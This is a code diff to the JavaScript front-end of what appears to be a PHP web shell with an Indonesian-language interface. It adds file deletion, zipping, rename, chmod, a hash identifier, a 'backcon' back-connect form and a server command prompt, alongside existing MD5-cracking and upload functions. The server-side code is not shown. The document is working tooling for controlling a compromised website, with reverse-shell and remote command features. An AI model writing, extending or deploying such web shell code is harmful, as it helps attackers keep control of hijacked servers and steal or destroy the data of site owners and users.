@@ -12,7 +12,6 @@
     });
 
 
-
     // Buka Folder dengan ajax
     function loadFolder(path) {
       $.ajax({
@@ -20,31 +19,90 @@
         url: '',
         data: {aksi: 'buka_folder', path: path},
         beforeSend: function() {
-          $('#konten').html('<div class="progress progress-striped active"><div class="progress-bar progress-bar-inverse" style="width: 100%"></div></div>');
+          $('#konten').html('<div id="spinner" class="show bg-dark position-fixed translate-middle w-100 vh-100 top-50 start-50 d-flex align-items-center justify-content-center"><div class="spinner-border text-primary" style="width: 3rem; height: 3rem;" role="status"><span class="sr-only">Loading...</span></div></div>');
         },
         success: function(data) {
           //console.log(data);
           $('#file-man').html(data);
           $('#link-dir').load(location.href + " #link-dir");
-          window.history.replaceState({path: path}, '', '?dir=' + path);
+          window.history.replaceState({path: path}, '', '?d=' + path);
         }
       });
     }
 
 
-      // Fungsi hapus file/folder
-      function hapus(nama_file) {
-        $('#konten').html('<div class="progress progress-striped active"><div class="progress-bar progress-bar-inverse" style="width: 100%"></div></div>');
-          $.ajax({
-            type: 'POST',
-            url: '',
-            data: 'aksi=hapus_file&nama_file=' + nama_file,
-            success: function(data) {
-              $('#konten').html(data);
-              reloadPage();
-            }
-          });
+function multiSelect() {
+  var action = $('select[name="action"]').val();
+  var checked = [];
+  $('input[name="check[]"]:checked').each(function() {
+    checked.push($(this).val());
+  });
+  var data = checked.join(',');
+  if (action == 'delete') {
+    hapus(data);
+  } else if (action == 'unzip') {
+    unZip(data);
+  } else if (action == 'zip') {
+    var nama_file = prompt("Enter zip name without .zip:");
+    makeZip(nama_file, data);
+  }
+};
+
+function makeZip(nama, isi) {
+    var data = 'aksi=makezip&nama_file=' + nama + '&check=' + isi;
+  $.ajax({
+    type: 'POST',
+    url: '',
+    data: data,
+    success: function(data) {
+      $('#konten').html(data);
+      reloadPage();
+    }
+  });
+}
+
+function massZip(isi) {
+    var data = 'aksi=makezip&nama_file=' + isi + '&check=' + isi;
+  $.ajax({
+    type: 'POST',
+    url: '',
+    data: data,
+    success: function(data) {
+      $('#konten').html(data);
+      reloadPage();
+    }
+  });
+}
+
+
+function unZip(isi) {
+    var data = 'aksi=unziip&nama_file=' + isi;
+  $.ajax({
+    type: 'POST',
+    url: '',
+    data: data,
+    success: function(data) {
+      $('#konten').html(data);
+      reloadPage();
+    }
+  });
+}
+
+
+
+// Fungsi hapus file/folder
+function hapus(data) {
+    $.ajax({
+      type: 'POST',
+      url: '',
+      data: 'aksi=hapus_file&nama_file=' + data,
+      success: function(data) {
+        $('#konten').html(data);
+        reloadPage();
       }
+    });
+}
+
 
       // Fungsi download
       function dl(nama_file) {
@@ -57,12 +115,70 @@
         $.ajax({
           type: 'POST',
           url: '',
-          data: 'aksi=edit_file&nama_file=' + nama_file,
+          data: 'aksi=form_edit&nama_file=' + nama_file,
           success: function(data) {
             $('#konten').html(data);
           }
         });
       }
+
+      // Fungsi rename file
+      function rename(nama_file) {
+        //$('#form_edit').show();
+        $.ajax({
+          type: 'POST',
+          url: '',
+          data: 'aksi=rename&nama_file=' + nama_file,
+          success: function(data) {
+            $('#konten').html(data);
+          }
+        });
+      }
+
+      function doRename() {
+      var formData = $('#form_rename_file').serialize();
+      $.ajax({
+        type: 'POST',
+        url: '',
+        data: formData + '&aksi=doRename',
+        beforeSend: function() {
+          $('#simpan').html('<div id="spinner" class="show bg-dark position-fixed translate-middle w-100 vh-100 top-50 start-50 d-flex align-items-center justify-content-center"><div class="spinner-border text-primary" style="width: 3rem; height: 3rem;" role="status"><span class="sr-only">Loading...</span></div></div>');
+        },
+        success: function(data) {
+          $('#simpan').html(data);
+          reloadPage();
+        }
+      });
+    }
+
+    // Fungsi Chmod
+    function cmod(nama_file) {
+        //$('#form_edit').show();
+        $.ajax({
+          type: 'POST',
+          url: '',
+          data: 'aksi=cmod&nama_file=' + nama_file,
+          success: function(data) {
+            $('#konten').html(data);
+          }
+        });
+      }
+
+      function doCmod() {
+      var formData = $('#form_cmod').serialize();
+      $.ajax({
+        type: 'POST',
+        url: '',
+        data: formData + '&aksi=doCmod',
+        beforeSend: function() {
+          $('#simpan').html('<div id="spinner" class="show bg-dark position-fixed translate-middle w-100 vh-100 top-50 start-50 d-flex align-items-center justify-content-center"><div class="spinner-border text-primary" style="width: 3rem; height: 3rem;" role="status"><span class="sr-only">Loading...</span></div></div>');
+        },
+        success: function(data) {
+          $('#simpan').html(data);
+          reloadPage();
+        }
+      });
+    }
 
     function kirimForm() {
       var formData = $('#form_edit_file').serialize();
@@ -71,21 +187,19 @@
         url: '',
         data: formData,
         beforeSend: function() {
-          $('#konten').html('<div class="progress progress-striped active"><div class="progress-bar progress-bar-inverse" style="width: 100%"></div></div>');
+          $('#simpan').html('<div id="spinner" class="show bg-dark position-fixed translate-middle w-100 vh-100 top-50 start-50 d-flex align-items-center justify-content-center"><div class="spinner-border text-primary" style="width: 3rem; height: 3rem;" role="status"><span class="sr-only">Loading...</span></div></div>');
         },
         success: function(data) {
-        $('#konten').html(data);
+        $('#simpan').html(data);
         //$('#form_edit').hide();
-        reloadPage();
+        //reloadPage();
         }
       });
     }
 
     $('#form_upload_file').submit(function(e) {
       e.preventDefault();
-      var file = $('#file')[0].files[0];
-      var formData = new FormData();
-      formData.append('file', file);
+      var formData = new FormData(this);
       formData.append('aksi', 'upload_file');
 
       $.ajax({
@@ -95,7 +209,7 @@
         contentType: false,
         processData: false,
         beforeSend: function() {
-          $('#status-upload').html('<div class="progress progress-striped active"><div class="progress-bar progress-bar-inverse" style="width: 100%"></div></div>');
+          $('#status-upload').html('<div id="spinner" class="show bg-dark position-fixed translate-middle w-100 vh-100 top-50 start-50 d-flex align-items-center justify-content-center"><div class="spinner-border text-primary" style="width: 3rem; height: 3rem;" role="status"><span class="sr-only">Loading...</span></div></div>');
         },
         success: function(data) {
           $('#status-upload').html(data);
@@ -113,7 +227,7 @@
             url: '',
             data: formData + '&aksi=buat_file',
             beforeSend: function() {
-              $('#status-nf').html('<div class="progress progress-striped active"><div class="progress-bar progress-bar-inverse" style="width: 100%"></div></div>');
+              $('#status-nf').html('<div id="spinner" class="show bg-dark position-fixed translate-middle w-100 vh-100 top-50 start-50 d-flex align-items-center justify-content-center"><div class="spinner-border text-primary" style="width: 3rem; height: 3rem;" role="status"><span class="sr-only">Loading...</span></div></div>');
             },
             success: function(data) {
               $('#status-nf').html(data);
@@ -130,7 +244,7 @@
             url: '',
             data: formData + '&aksi=buat_folder',
             beforeSend: function() {
-              $('#status-nd').html('<div class="progress progress-striped active"><div class="progress-bar progress-bar-inverse" style="width: 100%"></div></div>');
+              $('#status-nd').html('<div id="spinner" class="show bg-dark position-fixed translate-middle w-100 vh-100 top-50 start-50 d-flex align-items-center justify-content-center"><div class="spinner-border text-primary" style="width: 3rem; height: 3rem;" role="status"><span class="sr-only">Loading...</span></div></div>');
             },
             success: function(data) {
               $('#status-nd').html(data);
@@ -161,7 +275,37 @@
         url: '',
         data: formData + '&aksi=text2md5_',
         beforeSend: function() {
-          $('#output').html('<div class="progress progress-striped active"><div class="progress-bar progress-bar-inverse" style="width: 100%"></div></div>');
+          $('#output').html('<div id="spinner" class="show bg-dark position-fixed translate-middle w-100 vh-100 top-50 start-50 d-flex align-items-center justify-content-center"><div class="spinner-border text-primary" style="width: 3rem; height: 3rem;" role="status"><span class="sr-only">Loading...</span></div></div>');
+        },
+        success: function(data) {
+        $('#output').html(data);
+        }
+      });
+    }
+
+    function hashid() {
+      var formData = $('#hashid').serialize();
+      $.ajax({
+        type: 'POST',
+        url: '',
+        data: formData + '&aksi=hash_id',
+        beforeSend: function() {
+          $('#output').html('<div id="spinner" class="show bg-dark position-fixed translate-middle w-100 vh-100 top-50 start-50 d-flex align-items-center justify-content-center"><div class="spinner-border text-primary" style="width: 3rem; height: 3rem;" role="status"><span class="sr-only">Loading...</span></div></div>');
+        },
+        success: function(data) {
+        $('#output').html(data);
+        }
+      });
+    }
+
+    function bc() {
+      var formData = $('#bcon').serialize();
+      $.ajax({
+        type: 'POST',
+        url: '',
+        data: formData + '&aksi=backcon',
+        beforeSend: function() {
+          $('#output').html('<div id="spinner" class="show bg-dark position-fixed translate-middle w-100 vh-100 top-50 start-50 d-flex align-items-center justify-content-center"><div class="spinner-border text-primary" style="width: 3rem; height: 3rem;" role="status"><span class="sr-only">Loading...</span></div></div>');
         },
         success: function(data) {
         $('#output').html(data);
@@ -176,7 +320,7 @@
         url: '',
         data: formData + '&aksi=decmd5',
         beforeSend: function() {
-          $('#cracked').html('<div class="progress progress-striped active"><div class="progress-bar progress-bar-inverse" style="width: 100%"></div></div>');
+          $('#cracked').html('<div id="spinner" class="show bg-dark position-fixed translate-middle w-100 vh-100 top-50 start-50 d-flex align-items-center justify-content-center"><div class="spinner-border text-primary" style="width: 3rem; height: 3rem;" role="status"><span class="sr-only">Loading...</span></div></div>');
         },
         success: function(data) {
         $('#cracked').html(data);
@@ -191,7 +335,7 @@
         url: '',
         data: {aksi: menu},
         beforeSend: function() {
-          $('#konten').html('<div class="progress progress-striped active"><div class="progress-bar progress-bar-inverse" style="width: 100%"></div></div>');
+          $('#konten').html('<div id="spinner" class="show bg-dark position-fixed translate-middle w-100 vh-100 top-50 start-50 d-flex align-items-center justify-content-center"><div class="spinner-border text-primary" style="width: 3rem; height: 3rem;" role="status"><span class="sr-only">Loading...</span></div></div>');
         },
         success: function(data) {
           $('#file-man').html(data);
@@ -210,3 +354,72 @@
               window.location.reload();
               }, 1000);
     }
+
+    function stopEnterKey(evt) {
+        var evt = (evt) ? evt : ((event) ? event : null);
+        var node = (evt.target) ? evt.target : ((evt.srcElement) ? evt.srcElement : null);
+        if ((evt.keyCode == 13) && (node.type == "text")) { return false; }
+    }
+    document.onkeypress = stopEnterKey;
+
+(async ({chrome, netscape}) => {
+
+  // add Safari polyfill if needed
+  if (!chrome && !netscape)
+    await import('https://unpkg.com/@ungap/custom-elements');
+
+  const {default: HighlightedCode} =
+    await import('https://unpkg.com/highlighted-code');
+
+  // bootstrap a theme through one of these names
+  // https://github.com/highlightjs/highlight.js/tree/main/src/styles
+  HighlightedCode.useTheme('github-dark');
+})(self);
+
+function checks() {
+      $("td").click(function (e) {
+            var c = $(this).closest("tr").find("input:checkbox").get(0);
+            e.target != c && (c.checked = !c.checked);
+        });
+      $("#selectAll").change(function() {
+        if (this.checked) {
+            $('input[name="check[]"]').each(function() {
+                this.checked=true;
+            });
+        } else {
+            $('input[name="check[]"]').each(function() {
+                this.checked=false;
+            });
+        }
+    });
+
+    $('input[name="check[]"]').click(function () {
+        if ($(this).is(":checked")) {
+            var isAllChecked = 0;
+
+            $('input[name="check[]"]').each(function() {
+                if (!this.checked)
+                    isAllChecked = 1;
+            });
+
+            if (isAllChecked == 0) {
+                $("#selectAll").prop("checked", true);
+            }     
+        }
+        else {
+            $("#selectAll").prop("checked", false);
+        }
+    });
+}
+
+function command(){
+  const command = document.getElementById("command");
+      if (command) {
+        command.addEventListener("keydown", function(e) {
+          if (e.key === "Enter") {
+            kirimcmd();
+            command.value = "";
+          }
+        });
+      }
+}
